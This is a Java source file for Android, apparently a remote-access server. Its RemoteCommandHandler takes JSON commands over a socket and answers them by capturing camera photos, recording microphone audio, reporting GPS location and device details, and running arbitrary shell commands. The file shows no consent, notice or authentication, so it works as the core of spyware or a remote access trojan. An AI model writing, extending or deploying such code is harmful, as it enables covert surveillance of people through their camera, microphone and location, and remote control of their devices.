package com.cybersec.remoteserver;

import android.content.Context;
import android.graphics.Bitmap;
import android.hardware.Camera;
import android.location.Location;
import android.location.LocationManager;
import android.media.AudioFormat;
import android.media.AudioRecord;
import android.media.MediaRecorder;
import android.os.Build;
import android.util.Base64;

import org.json.JSONObject;

import java.io.ByteArrayOutputStream;
import java.io.DataInputStream;
import java.io.DataOutputStream;
import java.io.IOException;
import java.net.Socket;

@SuppressWarnings("deprecation")
public class RemoteCommandHandler {

    private Context context;
    private Camera camera;

    public RemoteCommandHandler(Context context) {
        this.context = context;
    }

    public void handleClient(Socket clientSocket) {
        new Thread(() -> {
            try {
                DataInputStream input = new DataInputStream(clientSocket.getInputStream());
                DataOutputStream output = new DataOutputStream(clientSocket.getOutputStream());

                while (!clientSocket.isClosed()) {
                    int length = input.readInt();
                    byte[] data = new byte[length];
                    input.readFully(data);
                    
                    String commandJson = new String(data, "UTF-8");
                    JSONObject command = new JSONObject(commandJson);
                    
                    JSONObject response = executeCommand(command);
                    
                    byte[] responseData = response.toString().getBytes("UTF-8");
                    output.writeInt(responseData.length);
                    output.write(responseData);
                    output.flush();
                }
            } catch (Exception e) {
                e.printStackTrace();
            } finally {
                try {
                    clientSocket.close();
                } catch (IOException e) {
                    e.printStackTrace();
                }
            }
        }).start();
    }

    private JSONObject executeCommand(JSONObject command) {
        JSONObject response = new JSONObject();
        try {
            String type = command.getString("type");
            
            switch (type) {
                case "webcam_start":
                    response = startCamera();
                    break;
                case "webcam_capture":
                    response = capturePhoto();
                    break;
                case "webcam_stop":
                    response = stopCamera();
                    break;
                case "audio_start":
                    int duration = command.optInt("duration", 5);
                    response = recordAudio(duration);
                    break;
                case "location":
                    response = getLocation();
                    break;
                case "sysinfo":
                    response = getSystemInfo();
                    break;
                case "shell":
                    String cmd = command.getString("cmd");
                    response = executeShell(cmd);
                    break;
                default:
                    response.put("status", "error");
                    response.put("message", "Commande inconnue");
            }
        } catch (Exception e) {
            try {
                response.put("status", "error");
                response.put("message", e.getMessage());
            } catch (Exception ex) {
                ex.printStackTrace();
            }
        }
        return response;
    }

    private JSONObject startCamera() {
        JSONObject response = new JSONObject();
        try {
            if (camera == null) {
                camera = Camera.open(0);
            }
            response.put("status", "success");
            response.put("message", "Caméra activée");
        } catch (Exception e) {
            try {
                response.put("status", "error");
                response.put("message", e.getMessage());
            } catch (Exception ex) {
                ex.printStackTrace();
            }
        }
        return response;
    }

    private JSONObject capturePhoto() {
        JSONObject response = new JSONObject();
        try {
            if (camera == null) {
                camera = Camera.open(0);
            }

            camera.takePicture(null, null, (data, cam) -> {
                try {
                    String base64Image = Base64.encodeToString(data, Base64.DEFAULT);
                    response.put("status", "success");
                    response.put("image", base64Image);
                    response.put("timestamp", System.currentTimeMillis());
                } catch (Exception e) {
                    e.printStackTrace();
                }
            });

            Thread.sleep(2000); // Attendre la capture
        } catch (Exception e) {
            try {
                response.put("status", "error");
                response.put("message", e.getMessage());
            } catch (Exception ex) {
                ex.printStackTrace();
            }
        }
        return response;
    }

    private JSONObject stopCamera() {
        JSONObject response = new JSONObject();
        try {
            if (camera != null) {
                camera.release();
                camera = null;
            }
            response.put("status", "success");
            response.put("message", "Caméra désactivée");
        } catch (Exception e) {
            try {
                response.put("status", "error");
                response.put("message", e.getMessage());
            } catch (Exception ex) {
                ex.printStackTrace();
            }
        }
        return response;
    }

    private JSONObject recordAudio(int duration) {
        JSONObject response = new JSONObject();
        try {
            int sampleRate = 44100;
            int bufferSize = AudioRecord.getMinBufferSize(sampleRate,
                    AudioFormat.CHANNEL_IN_MONO, AudioFormat.ENCODING_PCM_16BIT);

            AudioRecord audioRecord = new AudioRecord(MediaRecorder.AudioSource.MIC,
                    sampleRate, AudioFormat.CHANNEL_IN_MONO,
                    AudioFormat.ENCODING_PCM_16BIT, bufferSize);

            ByteArrayOutputStream outputStream = new ByteArrayOutputStream();
            byte[] buffer = new byte[bufferSize];

            audioRecord.startRecording();
            long startTime = System.currentTimeMillis();

            while (System.currentTimeMillis() - startTime < duration * 1000) {
                int read = audioRecord.read(buffer, 0, buffer.length);
                if (read > 0) {
                    outputStream.write(buffer, 0, read);
                }
            }

            audioRecord.stop();
            audioRecord.release();

            String base64Audio = Base64.encodeToString(outputStream.toByteArray(), Base64.DEFAULT);
            response.put("status", "success");
            response.put("audio", base64Audio);
            response.put("duration", duration);
        } catch (Exception e) {
            try {
                response.put("status", "error");
                response.put("message", e.getMessage());
            } catch (Exception ex) {
                ex.printStackTrace();
            }
        }
        return response;
    }

    private JSONObject getLocation() {
        JSONObject response = new JSONObject();
        try {
            LocationManager locationManager = (LocationManager) context.getSystemService(Context.LOCATION_SERVICE);
            Location location = locationManager.getLastKnownLocation(LocationManager.GPS_PROVIDER);

            if (location != null) {
                response.put("status", "success");
                response.put("latitude", location.getLatitude());
                response.put("longitude", location.getLongitude());
                response.put("accuracy", location.getAccuracy());
            } else {
                response.put("status", "error");
                response.put("message", "Localisation non disponible");
            }
        } catch (Exception e) {
            try {
                response.put("status", "error");
                response.put("message", e.getMessage());
            } catch (Exception ex) {
                ex.printStackTrace();
            }
        }
        return response;
    }

    private JSONObject getSystemInfo() {
        JSONObject response = new JSONObject();
        try {
            response.put("status", "success");
            response.put("platform", "Android");
            response.put("version", Build.VERSION.RELEASE);
            response.put("model", Build.MODEL);
            response.put("manufacturer", Build.MANUFACTURER);
            response.put("device", Build.DEVICE);
        } catch (Exception e) {
            try {
                response.put("status", "error");
                response.put("message", e.getMessage());
            } catch (Exception ex) {
                ex.printStackTrace();
            }
        }
        return response;
    }

    private JSONObject executeShell(String command) {
        JSONObject response = new JSONObject();
        try {
            Process process = Runtime.getRuntime().exec(command);
            process.waitFor();
            
            response.put("status", "success");
            response.put("message", "Commande exécutée");
        } catch (Exception e) {
            try {
                response.put("status", "error");
                response.put("message", e.getMessage());
            } catch (Exception ex) {
                ex.printStackTrace();
            }
        }
        return response;
    }
}
